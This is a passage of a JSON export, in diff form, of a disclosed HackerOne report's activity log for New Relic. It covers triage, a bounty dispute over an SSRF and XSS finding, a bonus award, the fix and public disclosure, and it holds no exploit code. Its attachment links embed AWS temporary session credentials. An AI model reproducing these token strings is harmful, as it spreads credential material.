+      "team_handle": "newrelic"
+    },
+    {
+      "id": 5990664,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Guys can I maybe help you somehow here?",
+      "automated_response": false,
+      "created_at": "2019-10-09T00:32:30.736Z",
+      "updated_at": "2019-10-09T00:32:30.736Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6008959,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello team,\n\nWhat is  the correct issue state now?",
+      "automated_response": false,
+      "created_at": "2019-10-11T02:00:50.005Z",
+      "updated_at": "2019-10-11T02:00:50.005Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6014394,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @skavans,\n\nWe're still investigating the impact of this issue. As soon as we have an update, we will update the status of the ticket. Thank you for your patience.",
+      "automated_response": false,
+      "created_at": "2019-10-11T14:07:34.511Z",
+      "updated_at": "2019-10-11T14:07:34.511Z",
+      "actor": {
+        "username": "nr-dm",
+        "cleared": false,
+        "verified": false,
+        "url": "/nr-dm",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6102931,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-10-22T07:42:09.747Z",
+      "updated_at": "2019-10-22T07:42:09.747Z",
+      "actor": {
+        "username": "jmcevoy",
+        "cleared": false,
+        "verified": false,
+        "url": "/jmcevoy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6102951,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @skavans,\n\nThank you for brining this to our attention.\n\nI have now logged this with the appropriate engineering teams for remediation.\n\nAs always, thank you for helping make New Relic safer!\nJoe",
+      "automated_response": false,
+      "created_at": "2019-10-22T07:43:51.565Z",
+      "updated_at": "2019-10-22T07:43:51.565Z",
+      "actor": {
+        "username": "jmcevoy",
+        "cleared": false,
+        "verified": false,
+        "url": "/jmcevoy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6102982,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "{F614181}",
+      "automated_response": false,
+      "created_at": "2019-10-22T07:46:56.766Z",
+      "updated_at": "2019-10-22T07:46:56.766Z",
+      "actor": {
+        "url": "/newrelic",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "New Relic"
+        }
+      },
+      "bounty_currency": "usd",
+      "attachments": [
+        {
+          "id": 614181,
+          "filename": "money-wire.jpg",
+          "type": "image/jpeg",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z75efbX7dcJ8KUoaBUrwkzAE?response-content-disposition=attachment%3B%20filename%3D%22money-wire.jpg%22%3B%20filename%2A%3DUTF-8%27%27money-wire.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=42e97ca7f8cef43ed8c9d04540e9a5dacd4da178234a63ada42cefa8d35fe6f6"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "newrelic",
+      "collaborator": {
+        "username": "skavans",
+        "url": "/skavans"
+      }
+    },
+    {
+      "id": 6103072,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey @jmcevoy,\n\nThank you for bounty! I’m surprised a little with such low reward amount though. This is full-fledged SSRF (I’ve demonstrated the AWS tokens leakage with potential to increase the impact to the RCE, but you asked me to stop diving) and the most impactful XSS I’ve found (cross-account and embeddable). Can you please explain your reward decision? Should I try to further escalate this to RCE? Even a simple stored XSS (not embeddable, not cross-account) is usually rewarded with $2500.",
+      "automated_response": false,
+      "created_at": "2019-10-22T08:05:51.894Z",
+      "updated_at": "2019-10-22T08:05:51.894Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6104168,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hi @skavans,\n\nThis report has been triaged as a \"High\".\n\nThe award granted is in line with our bug bounty program.\n\nhttps://hackerone.com/newrelic\n\n{F614240}\n\nHaving said that we have in some cases in the past awarded higher than this depending on the specifics of the report/vulnerability.\n\nIn this case due to the large amount of work you have undergone for this, the number of vulnerabilities listed and the great clarity you have included in the report I'm willing to award an additional bonus of $500 in this case.\n\nThanks again for all your hard work!,\nJoe",
+      "automated_response": false,
+      "created_at": "2019-10-22T08:56:52.958Z",
+      "updated_at": "2019-10-22T08:56:52.958Z",
+      "actor": {
+        "username": "jmcevoy",
+        "cleared": false,
+        "verified": false,
+        "url": "/jmcevoy",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "attachments": [
+        {
+          "id": 614240,
+          "filename": "New_Relic_-_Bug_Bounty_Program___HackerOne.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/QmukbhtuJYWrrTmHMeYD2nsw?response-content-disposition=attachment%3B%20filename%3D%22New_Relic_-_Bug_Bounty_Program___HackerOne.png%22%3B%20filename%2A%3DUTF-8%27%27New_Relic_-_Bug_Bounty_Program___HackerOne.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2944a3fe55bd5540339f78111ad23534634ea8e2a4d480c3726d6a7c49dbd2b8"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6104172,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-10-22T08:57:41.578Z",
+      "updated_at": "2019-10-22T08:57:41.578Z",
+      "actor": {
+        "url": "/newrelic",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "New Relic"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "newrelic",
+      "collaborator": {
+        "username": "skavans",
+        "url": "/skavans"
+      }
+    },
+    {
+      "id": 6104382,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks @jmcevoy!",
+      "automated_response": false,
+      "created_at": "2019-10-22T09:31:23.919Z",
+      "updated_at": "2019-10-22T09:31:23.919Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 6517366,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi @skavans , this looks resolved to me, as I am getting errors back from the server when trying your payloads. If you believe you have a workaround feel free to let us know *in this ticket* and we can re-evaluate from there. Thanks!\n{F656235}\n{F656236}",
+      "automated_response": false,
+      "created_at": "2019-12-10T22:22:14.961Z",
+      "updated_at": "2019-12-10T22:22:14.961Z",
+      "actor": {
+        "username": "scutler",
+        "cleared": false,
+        "verified": false,
+        "url": "/scutler",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/460/179/2c3ae155f2d3e021cae9e7e75456335c3c5514cd_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "skavans",
+        "url": "/skavans"
+      },
+      "attachments": [
+        {
+          "id": 656236,
+          "filename": "Screen_Shot_2019-12-10_at_2.20.01_PM.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Wnxa3ArQJw3TRyvBHGhaGTYY?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-10_at_2.20.01_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-10_at_2.20.01_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=c4eb66a80c23d8d2f768b974d8c7672a98bb0a3371c4bbfa709e297725787f97"
+        },
+        {
+          "id": 656235,
+          "filename": "Screen_Shot_2019-12-10_at_2.18.05_PM.png",
+          "type": "image/png",
+          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hq4jpbqfVVyQyDtxWsz6HXEv?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2019-12-10_at_2.18.05_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2019-12-10_at_2.18.05_PM.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ7IF72EGR%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T072526Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEC8aCXVzLXdlc3QtMiJIMEYCIQD0TAEi1peTsxNRMRsx2vBHR2pUGB7uHpbMRYg22KJXXAIhAOfNKRDia06ZOZMyd%2Fls3%2FTdPcLekbPiNmiZSXFYcx5uKrEFCCgQAxoMMDEzNjE5Mjc0ODQ5IgwjRpsfqQF%2BFfykAFMqjgXdivFzeRynUaxnCxzNhWzgVNVya2lqgNeJCfGD3wMjYG5xSgEab7GM4w5o9oGAL8%2BfjsZ7blKNrUlARcDh6fKoJ4rUV9jhNZz%2FvPSgXu6wzQtWtT5a2Ana5wpZSTzm8K62COIpOoBhJTTkJTT%2FdALIxUIidxqFRrLKAi89qr9bgJyQDu33TMI14lRF%2Bvauvx%2Bl9XKOvUSvEFRVuXhxrd%2FQ2SR68RCv05i8EW6Rw11j76ipoSR9CW95fmmNJg%2FEV4hGCi%2FyNDsBu4CQ2GM3PH2T%2ByfbJw85lnD6T%2Bcos3FcMzWc%2BVDZLk2j5FrFa0YExa9%2BN8LdhGVphEYnfjt9OFFnxcoC%2BnrZCSna21kk9sD1g0D8YjpQnNJmMJP%2BnOM7I%2Fk%2F77n4v30KuuC6hpT8twhDKILhks8yAwVuiyDBLgEMMdV1PeuUZFokagw0ONgLFZMZ5ElGYijYV8Dv0UlVGFJRzrpaxVl2Dy%2FWWgy0XMx%2FwG5k95kd%2FLkZ7w7o0%2FM%2FDJToli3C27uWWejCiuq95TXpXKCEzEWb0J4rh29e4hk7hq7OWOtQQTUde2q9wchyksu1rYzq2RCV2gM10O1mMJunqQSg6lES7Z5AvaCVheBpt2uRDsodnl9KD2I3VWF0kgJXSmcDVcQ4UxMShaao7WC7bcYWs%2BIjKN6C9mY9CzgacHoYHms6kZzPz2NrN%2F3cHhxk0zzINkWgZhR8IaHWOGyuyiZIbmQ2sv86YBVwYSb0hQj6n4rBtD8jilSYSnBbvxlJnRSCSIaYwiHuOcQhzmmbIT4pWyAbV4%2FmXomyu0ZvHzcxJiqRiIaBq0fx4B8qyvHCZ0MAWnqCAAlgmS%2BHlRuvxigPCB4nXZ59bhSNtaQw6pq6qAY6sAHlFHUDOcxyHvFiK44%2BbKKoa8xJyrD9kvKV1skKJvix2qkHIcCQAaIne5%2FQOqOFhO25Mu%2BP%2FIg08%2BZTLOQt7xdkt%2FsKZut84hBLHJYAq9vY1kXUeIPQ1avQ9%2FT2wWy9L5CTYbnxh26j%2Bo3NcBtG0oDQg%2BqPGSdORofiFd9dZKqJouuppKCv20%2FFJzBNvMZPpqAVejqiWUAwyYGwtPQUNvmJniwGk0kv1X8Rcycp1eaOEg%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dbce75c946604da0333bd0584e4ee675c208c55f7a270ed630418f4c30675151"
+        }
+      ],
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 8902558,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-11T09:34:43.177Z",
+      "updated_at": "2020-08-11T09:34:43.177Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 8923191,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Can we disclose this?",
+      "automated_response": false,
+      "created_at": "2020-08-13T08:31:03.185Z",
+      "updated_at": "2020-08-13T08:31:03.185Z",
+      "actor": {
+        "username": "skavans",
+        "cleared": false,
+        "verified": false,
+        "url": "/skavans",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 8924835,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-13T11:06:30.692Z",
+      "updated_at": "2020-08-13T11:06:30.692Z",
+      "actor": {
+        "username": "nr-dm",
+        "cleared": false,
+        "verified": false,
+        "url": "/nr-dm",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    },
+    {
+      "id": 8924836,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2020-08-13T11:06:30.805Z",
+      "updated_at": "2020-08-13T11:06:30.805Z",
+      "actor": {
+        "username": "nr-dm",
+        "cleared": false,
+        "verified": false,
+        "url": "/nr-dm",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "newrelic"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 127131,
+      "category": "researcher",
+      "content": "My Telegram channel about being the full-time bug bounty hunter, my tips and tricks:\n🇺🇸 [BugBountyPLZen](https://t.me/+mY0ndZYzGbYxYmYy)\n\nМой Telegram-канал про фуллтайм баг-хантинг, советы и методики:\n🇷🇺 [BugBountyPLZ](https://t.me/+WYgyG5n2_kM1Yzdi)",
+      "user": {
+        "id": 14089,
+        "username": "skavans",
+        "name": "Anton Subbotin",
+        "bio": "Swapped my office work for the bounty hunting ⚔️",
+        "cleared": false,
+        "verified": false,
+        "website": "https://skavans.ru/en/",
+        "location": "Russia",
+        "created_at": "2014-11-14T23:02:26.903Z",
+        "url": "https://hackerone.com/skavans",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/014/089/00a08f6b566bcdfe82b2f0be62bdde605a030823_original.jpg/114764ec8f01b1a3e153599212c9f011fb3b0bce3a4fdc1f9a3c551f8c94acf8"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    }
+  ]
+}
